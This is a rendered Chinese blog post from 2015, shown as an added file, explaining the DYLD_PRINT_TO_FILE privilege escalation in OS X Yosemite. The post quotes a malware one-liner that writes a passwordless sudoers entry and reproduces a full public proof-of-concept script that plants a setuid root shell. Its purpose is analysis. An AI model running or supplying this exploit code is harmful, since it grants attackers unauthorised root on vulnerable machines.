@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://badb100d.com').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: true,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="昨晚在[freebuf](http:&#x2F;&#x2F;www.freebuf.com&#x2F;news&#x2F;74180.html&quot;最新版苹果OS X10.10曝权限提升0day漏洞”)上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的DYLD_PRINT_TO_FILE环境变量来实现本地提权免密码root安装。脚本思路大致如下：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mac OSX yosemite本地提权漏洞">
+<meta property="og:url" content="https://badb100d.com/2015/08/07/2015-08-07/">
+<meta property="og:site_name" content="神经慢游者">
+<meta property="og:description" content="昨晚在[freebuf](http:&#x2F;&#x2F;www.freebuf.com&#x2F;news&#x2F;74180.html&quot;最新版苹果OS X10.10曝权限提升0day漏洞”)上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的DYLD_PRINT_TO_FILE环境变量来实现本地提权免密码root安装。脚本思路大致如下：">
+<meta property="og:locale">
+<meta property="article:published_time" content="2015-08-07T10:08:00.000Z">
+<meta property="article:modified_time" content="2015-08-07T10:08:01.000Z">
+<meta property="article:author" content="badb100d">
+<meta property="article:tag" content="osx">
+<meta property="article:tag" content="macos">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://badb100d.com/2015/08/07/2015-08-07/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Mac OSX yosemite本地提权漏洞 | 神经慢游者</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1ca2b5f92839d7e9bcc9959b6d203a0c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="神经慢游者" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">神经慢游者</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">neurolagger</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">11</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">11</span></a>
+
+  </li>
+        <li class="menu-item menu-item-rss">
+
+    <a href="/atom.xml" rel="section"><i class="fa fa-fw fa-rss"></i>rss</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://badb100d.com/2015/08/07/2015-08-07/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="badb100d">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="神经慢游者">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Mac OSX yosemite本地提权漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2015-08-07 18:08:00 / Modified: 18:08:01" itemprop="dateCreated datePublished" datetime="2015-08-07T18:08:00+08:00">2015-08-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tech/" itemprop="url" rel="index">
+                    <span itemprop="name">tech</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span id="/2015/08/07/2015-08-07/" class="post-meta-item leancloud_visitors" data-flag-title="Mac OSX yosemite本地提权漏洞" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2015/08/07/2015-08-07/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2015/08/07/2015-08-07/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>昨晚在[freebuf](<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWwmcXVvdDvmnIDmlrDniYjoi7nmnpxPUw==" title="http://www.freebuf.com/news/74180.html&quot;最新版苹果OS">http://www.freebuf.com/news/74180.html&quot;最新版苹果OS<i class="fa fa-external-link"></i></span> X10.10曝权限提升0day漏洞”)上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的<strong>DYLD_PRINT_TO_FILE</strong>环境变量来实现本地提权免密码root安装。<br>脚本思路大致如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;echo \&quot;<span class="subst">$(whoami)</span> ALL=(ALL) NOPASSWD:ALL\&quot; &gt;&amp;3 &quot;</span>|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo -s dosomethingroot</span><br></pre></td></tr></table></figure>
+<p>[DYLD](<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYXBwbGUuY29tL2xpYnJhcnkvcHJlcmVsZWFzZS9tYWMvZG9jdW1lbnRhdGlvbi9EYXJ3aW4vUmVmZXJlbmNlL01hblBhZ2VzL21hbjEvZHlsZC4xLmh0bWwmcXVvdDthcHBsZQ==" title="https://developer.apple.com/library/prerelease/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html&quot;apple">https://developer.apple.com/library/prerelease/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html&quot;apple<i class="fa fa-external-link"></i></span> manual”)全称dynamic link editor，听名字是实现类似动态链接库加载的东西，<strong>DYLD_PRINT_TO_FILE</strong>是苹果在OSX 10.10加入的一个新特性，主要功能是实现将dyld进程的错误日志重定向到此环境变量指定的可写文件。不过添加这个特性的时候貌似没把它加在有安全验证的代码范围内而是直接写在dyld的main里了。。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大致添加的代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* loggingPath = _simple_getenv(envp, <span class="string">&quot;DYLD_PRINT_TO_FILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( loggingPath != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, <span class="number">0644</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd != <span class="number">-1</span> ) &#123;</span><br><span class="line">                sLogfile = fd;</span><br><span class="line">                sLogToFile = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                dyld::<span class="built_in">log</span>(<span class="string">&quot;dyld: could not open DYLD_PRINT_TO_FILE=&#x27;%s&#x27;, errno=%d\n&quot;</span>, loggingPath, errno);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从代码中来看dyld是直接从环境变量中获取<strong>DYLD_PRINT_TO_FILE</strong>的值作为文件路径并append写打开文件，那么问题就来了。。。<br>普通用户可以利用这个变量在系统目录创建文件，或如前面的恶意软件那样修改root的配置文件，或修改SUID的bin文件。<br>更严重的是这个文件的描述符并没有被关闭，特权父进程fork出的子进程都可以对文件进行操作。<br>了解了原理再看恶意软件的代码，脚本首先设置环境变量DYLD_PRINT_TO_FILE，再启动newgrp这个SUID文件来执行echo “string” &gt; &amp;3的操作，此时3通过<strong>DYLD_PRINT_TO_FILE</strong>分配给了sudoers文件，所以结果就是在sudoers的尾部添加了一行针对当前账户的配置，脚本再去执行sudo -s command就没有提示了。<br>google了一番看了些歪果仁写的帖子，以下为两个关于此漏洞的poc脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  EDITOR=/usr/bin/<span class="literal">true</span> DYLD_PRINT_TO_FILE=/this_system_is_vulnerable crontab -e</span><br></pre></td></tr></table></figure>
+<p>这个poc用的是suid的crontab作loader</p>
+<p>下面是一个精彩的poc</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Simple Proof of Concept Exploit for the DYLD_PRINT_TO_FILE</span></span><br><span class="line"><span class="comment"># local privilege escalation vulnerability in OS X 10.10 - 10.10.4</span></span><br><span class="line"><span class="comment"># (C) Copyright 2015 Stefan Esser &lt;stefan.esser@sektioneins.de&gt;</span></span><br><span class="line"><span class="comment"># Wait months for a fix from Apple or install the following KEXT as protection</span></span><br><span class="line"><span class="comment"># https://github.com/sektioneins/SUIDGuard</span></span><br><span class="line"><span class="comment"># Use at your own risk. This copies files around with root permissions,</span></span><br><span class="line"><span class="comment"># overwrites them and deletes them afterwards. Any glitch could corrupt your</span></span><br><span class="line"><span class="comment"># system. So you have been warned.</span></span><br><span class="line">SUIDVICTIM=/usr/bin/newgrp</span><br><span class="line"><span class="comment"># why even try to prevent a race condition?</span></span><br><span class="line">TARGET=`<span class="built_in">pwd</span>`/tmpXXXXX</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">mkdir <span class="variable">$TARGET</span></span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/boomsh.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">        setuid(0);</span></span><br><span class="line"><span class="string">        setgid(0);</span></span><br><span class="line"><span class="string">        system(&quot;/bin/bash -i&quot;);</span></span><br><span class="line"><span class="string">        printf(&quot;done.\n&quot;);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(int argc, char **argv)&#123;</span></span><br><span class="line"><span class="string">        int fd;</span></span><br><span class="line"><span class="string">        char buffer[1024];</span></span><br><span class="line"><span class="string">        ssize_t toread, numread;</span></span><br><span class="line"><span class="string">        ssize_t numwritten;</span></span><br><span class="line"><span class="string">        ssize_t size;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* disable O_APPEND */</span></span><br><span class="line"><span class="string">        fcntl(3, F_SETFL, 0);</span></span><br><span class="line"><span class="string">        lseek(3, 0, SEEK_SET);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* write file into it */</span></span><br><span class="line"><span class="string">        fd = open(</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;<span class="variable">$TARGET</span>/boomsh\&quot;&quot;</span> &gt;&gt; <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt;&gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">        , O_RDONLY, 0);</span></span><br><span class="line"><span class="string">        if (fd &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                /* determine size */</span></span><br><span class="line"><span class="string">                size = lseek(fd, 0, SEEK_END);</span></span><br><span class="line"><span class="string">                lseek(fd, 0, SEEK_SET);</span></span><br><span class="line"><span class="string">                while (size &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                        if (size &gt; sizeof(buffer)) &#123;</span></span><br><span class="line"><span class="string">                                toread = sizeof(buffer);</span></span><br><span class="line"><span class="string">                        &#125; else &#123;</span></span><br><span class="line"><span class="string">                                toread = size;</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numread = read(fd, &amp;buffer, toread);</span></span><br><span class="line"><span class="string">                        if (numread &lt; toread) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem reading\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numwritten = write(3, &amp;buffer, numread);</span></span><br><span class="line"><span class="string">                        if (numread != numwritten) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem writing\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        size -= numwritten;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                fsync(3);</span></span><br><span class="line"><span class="string">                close(fd);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;Cannot open for reading\n&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cp <span class="variable">$SUIDVICTIM</span> <span class="variable">$TARGET</span>/backup</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/overwrite <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/boomsh <span class="variable">$TARGET</span>/boomsh.c</span><br><span class="line">EDITOR=<span class="variable">$TARGET</span>/overwrite DYLD_PRINT_TO_FILE=<span class="variable">$SUIDVICTIM</span> crontab -e 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/boomsh /usr/bin/boomsh; chmod 04755 /usr/bin/boomsh &quot;</span> | <span class="variable">$SUIDVICTIM</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/backup <span class="variable">$SUIDVICTIM</span>&quot;</span> | /usr/bin/boomsh &gt; /dev/null 2&gt; /dev/null</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">/usr/bin/boomsh</span><br></pre></td></tr></table></figure>
+
+<p>这风骚的bash姿势也是让人大开眼界，歪果仁真会玩。<br>脚本生成了两个c，第一个比较简单，先设置用户和组到root，再调用bash；第二个把第一个生成的二进制读出来再写到文件流3(DYLD_PRINT_TO_FILE)里。<br>之后脚本把newgrp(host suid)拷到临时文件，编译两个c，通过crontab(loader suid)获得高权限的3文件描述符(写到host suid)，crontab调用EDITOR把boomsh写到3(不要求特权)，然后调用被修改了的newgrp(host suid)安装boomsh并设置boomsh的suid，再调用安装好的boomsh还原newgrp，删除临时文件，执行boomsh。</p>
+<p>这里需要提一点，虽然write的manual中说非特权账户write带suid的bin时会去除bin的suid，但得益于DYLD_PRINT_TO_FILE，loader suid进程以root打开了带suid的host bin，文件描述符继承了root级别的特权，所以对描述符的操作会被认为是root级的，所以没有触发manual中说的对write的限制，具体的细节应该类似于win下文件的context之类的吧。</p>
+<p>开发人员的安全意识有待提高啊。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VrdGlvbmVpbnMuZGUvZW4vYmxvZy8xNS0wNy0wNy1keWxkX3ByaW50X3RvX2ZpbGVfbHBlLmh0bWw=" title="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html">参考链接<i class="fa fa-external-link"></i></span></p>
+
+    </div>
+
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>谢谢老板打赏 Or2</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="badb100d Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="badb100d WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>badb100d
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://badb100d.com/2015/08/07/2015-08-07/" title="Mac OSX yosemite本地提权漏洞">https://badb100d.com/2015/08/07/2015-08-07/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/osx/" rel="tag"># osx</a>
+              <a href="/tags/macos/" rel="tag"># macos</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2015/07/22/2015-07-22/" rel="prev" title="对付以减号开头的文件">
+      <i class="fa fa-chevron-left"></i> 对付以减号开头的文件
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2015/09/30/2015-09-30/" rel="next" title="A shell trick">
+      A shell trick <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="badb100d"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">badb100d</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">badb100d</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
